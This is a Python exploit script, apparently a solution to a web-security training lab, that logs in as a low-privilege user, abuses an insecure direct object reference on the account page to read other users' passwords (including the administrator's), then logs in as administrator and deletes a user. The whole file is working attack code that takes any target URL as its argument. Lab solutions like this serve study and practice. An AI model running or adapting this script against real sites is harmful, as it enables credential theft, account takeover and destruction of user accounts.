import requests
import sys
import re

def get_csrf_token(url, session):
    response = session.get(url)
    text = response.text
    csrf_reg = (re.search("csrf(.*)", text).group(1))
    token = csrf_reg.split('"')[2]
    return token


def login(url, session, username, password):
    print(f"(+) Logging in as user {username}...")
    login_url = url + "/login"
    csrf_token = get_csrf_token(login_url, session)
    data = {"username": username, "password": password, "csrf": csrf_token}
    response = session.post(login_url, data=data)
    res = response.text
    if "Log out" in response.text:
        print("(+) Successfully logged in!")
    else:
        print("(+) Could not login!")
        print("(+) Exiting...")
        sys.exit(1)
 

def get_password(url, session):
    #Getting Carlos's password
    print("(+) Getting Carlos's password...")

    carlos_account = url + "/my-account?id=carlos"
    response = session.get(carlos_account)
    text = response.text
    if "carlos" in text:

        password_reg = (re.search("name=password(.*)", text).group(1))
        password = password_reg.split("'")[1]
        if password:
            print(f"(+) Carlos's password is: {password}")
        else:
            print("(-) Could not find Carlos's password")
            print("(+) Trying Administrator...")
    else:
        print("(-) User Carlos already deleted.")
        print("(-) Exiting...")
        sys.exit(1)

    #Getting the administrator's password.

    print("(+) Getting Administrator's password...")

    carlos_account = url + "/my-account?id=administrator"
    response = session.get(carlos_account)
    text = response.text

    pattern = r"value='([A-Za-z0-9]+)'"
    match = re.search(pattern, text)
    if match:
        password = match.group(1)
        print(f"(+) Administrator's password is: {password}")

    else:
        print("(-) Could not find Administrator's password.")
        print("(-) Exiting...")
        sys.exit(1)

    delete_carlos(url, session, password)

def delete_carlos(url, session, password):
    login(url, session, "Administrator", password)

    print("(+) Deleting user Carlos...")
    delete_url = url + "/admin/delete?username=carlos"
    delete_user = session.get(delete_url, allow_redirects=False)
    if delete_user.status_code == 302:
        print("(+) Successfully deleted user carlos.")
    else:
        print("(-) Could not delete user carlos!")
        print("(-) Exiting...")
        sys.exit(1)




def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        sys.exit(1)
    
    print("(+) Starting the script...")
    url = sys.argv[1]
    session = requests.Session()
    login(url, session, "Wiener", "peter")
    get_password(url, session)


if __name__ == "__main__":
    main()